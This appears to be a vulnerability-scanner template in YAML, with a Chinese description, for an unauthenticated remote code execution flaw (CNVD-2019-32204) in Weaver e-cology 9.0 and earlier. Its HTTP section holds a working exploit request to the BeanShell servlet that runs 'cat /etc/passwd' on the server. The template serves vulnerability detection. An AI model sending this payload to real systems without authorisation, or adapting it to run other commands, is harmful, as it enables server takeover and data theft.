id: CNVD-2019-32204

info:
  name: 泛微 e-cology <= 9.0 远程代码执行漏洞（CNVD-2019-32204）
  author: daffainfo
  severity: critical
  description: 泛微 e-cology 9.0 及以下版本存在远程代码执行风险，攻击者可借助未授权的 BeanShell 组件接口直接在服务器上执行命令。模板通过触发命令执行并匹配系统文件内容来确认漏洞。
  reference:
    - https://blog.actorsfit.com/a?ID=01500-11a2f7e6-54b0-4a40-9a79-5c56dc6ebd51
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 1
  tags: cnvd,cnvd2019,fanwei,rce,vuln

http:
  - raw:
      - |
        POST /bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
